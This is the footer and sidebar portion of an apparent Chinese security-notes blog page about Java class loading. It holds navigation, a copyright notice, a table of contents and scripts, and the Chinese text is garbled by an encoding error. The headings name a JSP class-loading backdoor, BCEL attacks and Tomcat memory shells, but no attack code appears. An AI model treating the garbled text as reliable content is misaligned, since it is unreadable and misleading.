i-tag"></i> Javaå®‰å…¨åŸºç¡€ç¯‡</a></div></div><footer><div class="meta"></div><div class="reward"><button><i class="ic i-heartbeat"></i> èµèµ</button><p>è¯·æˆ‘å–[èŒ¶]~(ï¿£â–½ï¿£)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="ä½™æ˜Ÿé…’ å¾®ä¿¡æ”¯ä»˜"><p>å¾®ä¿¡æ”¯ä»˜</p></div><div><img data-src="/images/alipay.png" alt="ä½™æ˜Ÿé…’ æ”¯ä»˜å®"><p>æ”¯ä»˜å®</p></div><div><img data-src="/images/paypal.png" alt="ä½™æ˜Ÿé…’ è´å®"><p>è´å®</p></div></div></div><div id="copyright"><ul><li class="author"><strong>æœ¬æ–‡ä½œè€…ï¼š </strong>ä½™æ˜Ÿé…’ <i class="ic i-at"><em>@</em></i>ä½™æ˜Ÿé…’</li><li class="link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong> <a href="http://example.com/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" title="1. javaç±»åŠ è½½æœºåˆ¶">http://example.com/APT/ä»£ç å®¡è®¡/Javaä»£ç å®¡è®¡/å®¡è®¡åŸºç¡€/Javaç±»åŠ è½½æœºåˆ¶/</a></li><li class="license"><strong>ç‰ˆæƒå£°æ˜ï¼š </strong>æœ¬ç«™æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/JaveEE%E6%A0%B8%E5%BF%83/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclwrdwyaj20zk0m8are.jpg" title="10. JaveEEæ ¸å¿ƒ"><span class="type">ä¸Šä¸€ç¯‡</span> <span class="category"><i class="ic i-flag"></i> Javaå®‰å…¨åŸºç¡€</span><h3>10. JaveEEæ ¸å¿ƒ</h3></a></div><div class="item right"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/sun.misc.Unsafe/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipevo9j1jj20zk0m8e81.jpg" title="3. sun.misc.Unsafe"><span class="type">ä¸‹ä¸€ç¯‡</span> <span class="category"><i class="ic i-flag"></i> Javaå®‰å…¨åŸºç¡€</span><h3>3. sun.misc.Unsafe</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="æ–‡ç« ç›®å½•"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6"><span class="toc-number">1.</span> <span class="toc-text">ç±»åŠ è½½æœºåˆ¶</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%9A%84%E7%A7%8D%E7%B1%BB"><span class="toc-number">1.1.</span> <span class="toc-text">ç±»åŠ è½½å™¨çš„ç§ç±»</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bootstarp-ClassLoader"><span class="toc-number">1.1.1.</span> <span class="toc-text">Bootstarp ClassLoader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Extension-ClassLoader"><span class="toc-number">1.1.2.</span> <span class="toc-text">Extension ClassLoader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Application-ClassLoader"><span class="toc-number">1.1.3.</span> <span class="toc-text">Application ClassLoader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User-ClassLoader"><span class="toc-number">1.1.4.</span> <span class="toc-text">User ClassLoader</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%89%98%E6%9C%BA%E5%88%B6"><span class="toc-number">1.2.</span> <span class="toc-text">åŒäº²å§”æ‰˜æœºåˆ¶</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ClassLoader%EF%BC%88%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">ClassLoaderï¼ˆç±»åŠ è½½æœºåˆ¶ï¼‰</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E7%B1%BB"><span class="toc-number">3.</span> <span class="toc-text">Javaç±»</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ClassLoader"><span class="toc-number">4.</span> <span class="toc-text">ClassLoader</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Java-%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E6%96%B9%E5%BC%8F"><span class="toc-number">5.</span> <span class="toc-text">Java ç±»åŠ¨æ€åŠ è½½æ–¹å¼</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ClassLoader-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B"><span class="toc-number">6.</span> <span class="toc-text">ClassLoader ç±»åŠ è½½æµç¨‹</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89-ClassLoader"><span class="toc-number">7.</span> <span class="toc-text">è‡ªå®šä¹‰ ClassLoader</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#loadClass"><span class="toc-number">7.0.1.</span> <span class="toc-text">loadClass()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">7.0.2.</span> <span class="toc-text">è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨</span></a></li></ol></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#URLClassLoader"><span class="toc-number">8.</span> <span class="toc-text">URLClassLoader</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E9%9A%94%E7%A6%BB"><span class="toc-number">9.</span> <span class="toc-text">ç±»åŠ è½½éš”ç¦»</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8A%A0%E8%BD%BD"><span class="toc-number">9.1.</span> <span class="toc-text">è·¨ç±»åŠ è½½å™¨åŠ è½½</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JSP-%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%90%8E%E9%97%A8"><span class="toc-number">10.</span> <span class="toc-text">JSP è‡ªå®šä¹‰ç±»åŠ è½½åé—¨</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BCEL-ClassLoader"><span class="toc-number">11.</span> <span class="toc-text">BCEL ClassLoader</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BCEL-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">11.1.</span> <span class="toc-text">BCEL æ”»å‡»åŸç†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BCEL-%E7%BC%96%E8%A7%A3%E7%A0%81"><span class="toc-number">11.2.</span> <span class="toc-text">BCEL ç¼–è§£ç </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Xalan-ClassLoader"><span class="toc-number">12.</span> <span class="toc-text">Xalan ClassLoader</span></a></li></div><div class="related panel pjax" data-title="ç³»åˆ—æ–‡ç« "><ul><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E7%BC%96%E8%BE%91%E5%99%A8%E4%BD%BF%E7%94%A8/" rel="bookmark" title="ideaåŸºç¡€ä½¿ç”¨">ideaåŸºç¡€ä½¿ç”¨</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" rel="bookmark" title="åŠ¨æ€ä»£ç†">åŠ¨æ€ä»£ç†</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/" rel="bookmark" title="ç±»åŠ¨æ€åŠ è½½">ç±»åŠ¨æ€åŠ è½½</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="bookmark" title="Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–">Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E5%8F%8D%E5%B0%84/" rel="bookmark" title="Javaåå°„">Javaåå°„</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/JaveEE%E6%A0%B8%E5%BF%83/" rel="bookmark" title="10. JaveEEæ ¸å¿ƒ">10. JaveEEæ ¸å¿ƒ</a></li><li class="active"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" rel="bookmark" title="1. javaç±»åŠ è½½æœºåˆ¶">1. javaç±»åŠ è½½æœºåˆ¶</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/sun.misc.Unsafe/" rel="bookmark" title="3. sun.misc.Unsafe">3. sun.misc.Unsafe</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/" rel="bookmark" title="4. javaæ–‡ä»¶ç³»ç»Ÿå®‰å…¨">4. javaæ–‡ä»¶ç³»ç»Ÿå®‰å…¨</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/JDBC/" rel="bookmark" title="6. JDBC">6. JDBC</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" rel="bookmark" title="Tomcatå†…å­˜é©¬">Tomcatå†…å­˜é©¬</a></li></ul></div><div class="overview panel" data-title="ç«™ç‚¹æ¦‚è§ˆ"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="ä½™æ˜Ÿé…’" data-src="/images/avatar.jpg"><p class="name" itemprop="name">ä½™æ˜Ÿé…’</p><div class="description" itemprop="description">æ¬¢è¿å‚è§‚æˆ‘çš„ç¬”è®°ç©ºé—´ ~ è¿™é‡Œä¸»è¦ä¼šè®°å½•ä¸€äº›å®‰å…¨ç›¸å…³çš„å­¦ä¹ ç¬”è®° ğŸŒ¸</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">253</span> <span class="name">æ–‡ç« </span></a></div><div class="item categories"><a href="/categories/"><span class="count">43</span> <span class="name">åˆ†ç±»</span></a></div><div class="item tags"><a href="/tags/"><span class="count">36</span> <span class="name">æ ‡ç­¾</span></a></div></nav><div class="social"></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>é¦–é¡µ</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>å…³äº</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>æ–‡ç« </a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>å½’æ¡£</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>åˆ†ç±»</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>æ ‡ç­¾</a></li></ul></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/JaveEE%E6%A0%B8%E5%BF%83/" rel="prev" title="ä¸Šä¸€ç¯‡"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/sun.misc.Unsafe/" rel="next" title="ä¸‹ä¸€ç¯‡"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>éšæœºæ–‡ç« </h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="åˆ†ç±»äº ä»£ç å®¡è®¡">ä»£ç å®¡è®¡</a> <i class="ic i-angle-right"></i> <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" title="åˆ†ç±»äº Javaå®‰å…¨åŸºç¡€">Javaå®‰å…¨åŸºç¡€</a></div><span><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" title="åŠ¨æ€ä»£ç†">åŠ¨æ€ä»£ç†</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/APT/" title="åˆ†ç±»äº æ¸—é€æµ‹è¯•">æ¸—é€æµ‹è¯•</a> <i class="ic i-angle-right"></i> <a href="/categories/APT/web%E6%B8%97%E9%80%8F/" title="åˆ†ç±»äº webæ¸—é€">webæ¸—é€</a></div><span><a href="/APT/web%E6%B8%97%E9%80%8F/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" title="ç›®å½•éå†">ç›®å½•éå†</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/APT/" title="åˆ†ç±»äº æ¸—é€æµ‹è¯•">æ¸—é€æµ‹è¯•</a> <i class="ic i-angle-right"></i> <a href="/categories/APT/%E9%9D%B6%E5%9C%BA/" title="åˆ†ç±»äº é¶åœº">é¶åœº</a></div><span><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/vulnhub/Chili-1/" title="Chili-1">Chili-1</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Other/" title="åˆ†ç±»äº æ‚é¡¹">æ‚é¡¹</a></div><span><a href="/Other/%E5%85%B6%E4%BD%99%E6%8C%87%E4%BB%A4/" title="å…¶ä½™æŒ‡ä»¤">å…¶ä½™æŒ‡ä»¤</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/System/" title="åˆ†ç±»äº æ“ä½œç³»ç»Ÿ">æ“ä½œç³»ç»Ÿ</a> <i class="ic i-angle-right"></i> <a href="/categories/System/centos/" title="åˆ†ç±»äº centos">centos</a></div><span><a href="/System/centos/Linux%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/" title="LinuxåŸºç¡€é…ç½®">LinuxåŸºç¡€é…ç½®</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Program/" title="åˆ†ç±»äº ç¼–ç¨‹">ç¼–ç¨‹</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/" title="åˆ†ç±»äº Golang">Golang</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/%E9%A1%B9%E7%9B%AE/" title="åˆ†ç±»äº é¡¹ç›®">é¡¹ç›®</a></div><span><a href="/Program/golang/%E9%A1%B9%E7%9B%AE/%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8/" title="å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨">å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/PDCERF/" title="åˆ†ç±»äº åº”æ€¥å“åº”">åº”æ€¥å“åº”</a> <i class="ic i-angle-right"></i> <a href="/categories/PDCERF/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" title="åˆ†ç±»äº æ—¥å¿—åˆ†æ">æ—¥å¿—åˆ†æ</a></div><span><a href="/PDCERF/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" title="Linuxæ—¥å¿—åˆ†æ">Linuxæ—¥å¿—åˆ†æ</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="åˆ†ç±»äº ç½‘ç»œ">ç½‘ç»œ</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/" title="åˆ†ç±»äº åä¸ºé˜²ç«å¢™">åä¸ºé˜²ç«å¢™</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/%E5%9F%BA%E7%A1%80/" title="åˆ†ç±»äº åŸºç¡€">åŸºç¡€</a></div><span><a href="/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/NGFW/%E9%98%B2%E7%81%AB%E5%A2%99%E6%99%BA%E8%83%BD%E9%80%89%E8%B7%AF/" title="é˜²ç«å¢™æ™ºèƒ½é€‰è·¯">é˜²ç«å¢™æ™ºèƒ½é€‰è·¯</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/System/" title="åˆ†ç±»äº æ“ä½œç³»ç»Ÿ">æ“ä½œç³»ç»Ÿ</a> <i class="ic i-angle-right"></i> <a href="/categories/System/centos/" title="åˆ†ç±»äº centos">centos</a></div><span><a href="/System/centos/Linux%E6%97%A5%E5%BF%97/" title="Linuxæ—¥å¿—">Linuxæ—¥å¿—</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/APT/" title="åˆ†ç±»äº æ¸—é€æµ‹è¯•">æ¸—é€æµ‹è¯•</a> <i class="ic i-angle-right"></i> <a href="/categories/APT/web%E6%B8%97%E9%80%8F/" title="åˆ†ç±»äº webæ¸—é€">webæ¸—é€</a></div><span><a href="/APT/web%E6%B8%97%E9%80%8F/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" title="å˜é‡è¦†ç›–">å˜é‡è¦†ç›–</a></span></li></ul></div><div><h2>æœ€æ–°è¯„è®º</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 â€“ <span itemprop="copyrightYear">2024</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">ä½™æ˜Ÿé…’ @ ä½™æ˜Ÿé…’</span></div><div class="powered-by">åŸºäº <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"APT/ä»£ç å®¡è®¡/Javaä»£ç å®¡è®¡/å®¡è®¡åŸºç¡€/Javaç±»åŠ è½½æœºåˆ¶/",favicon:{show:"ï¼ˆâ—Â´3ï½€â—ï¼‰ã‚„ã‚Œã‚„ã‚Œã ãœ",hide:"(Â´Ğ”ï½€)å¤§å¤‰ã ï¼"},search:{placeholder:"æ–‡ç« æœç´¢",empty:"å…³äº ã€Œ ${query} ã€ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœåˆ°",stats:"${time} ms å†…æ‰¾åˆ° ${hits} æ¡ç»“æœ"},valine:!0,fancybox:!0,copyright:'å¤åˆ¶æˆåŠŸï¼Œè½¬è½½è¯·éµå®ˆ <i class="ic i-creative-commons"></i>BY-NC-SA åè®®ã€‚',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->